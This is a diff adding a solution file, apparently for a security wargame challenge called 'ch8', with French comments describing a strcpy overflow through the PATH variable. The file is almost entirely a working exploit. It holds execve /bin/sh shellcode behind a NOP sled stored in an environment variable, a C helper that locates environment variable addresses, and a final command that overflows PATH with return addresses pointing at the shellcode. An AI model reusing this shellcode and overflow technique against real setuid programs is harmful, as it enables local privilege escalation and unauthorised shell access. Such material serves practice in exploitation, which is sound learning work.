@@ -1,0 +1,45 @@
+#il nous faut un env avec au moins 4 variable
+#on rajoute la variable username
+#on exploite le strcpy qui copie jusqu'au \0, on le fait sur le path
+#on met notre script shell dans l'env
+#on prend de la place dans l'env pour le return env, on note cette adresse pour le premier segv (0xbffffc09) 
+#on ajoute l'adresse a notre scriptshell (0xbffff982)
+
+
+export USERNAME=boo
+export shel=`python -c 'print "\x90"* 1024 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+cd /tmp
+vi c.c
+>>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+	char *ptr;
+
+	if(argc < 3) {
+		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+		exit(0);
+	}
+	ptr = getenv(argv[1]); /* get env var location */
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+	printf("%s will be at %p\n", argv[1], ptr);
+}
+<<
+gcc -o c c.c
+cd
+/tmp/c shel ch8
+
+shel will be at 0xbffffe36
+
+export vide=`python -c 'print "\x90" * 1024'`
+/tmp/c vide ch8
+
+
+shel will be at 0xbffff662
+vide will be at 0xbffffb7b
+
+
+env PATH=`python -c "print 'A'*160 + '\x62\xf6\xff\xbf'*2 + '\x7b\xfb\xff\xbf'*2 + 'B' * 500"` ./ch8
+
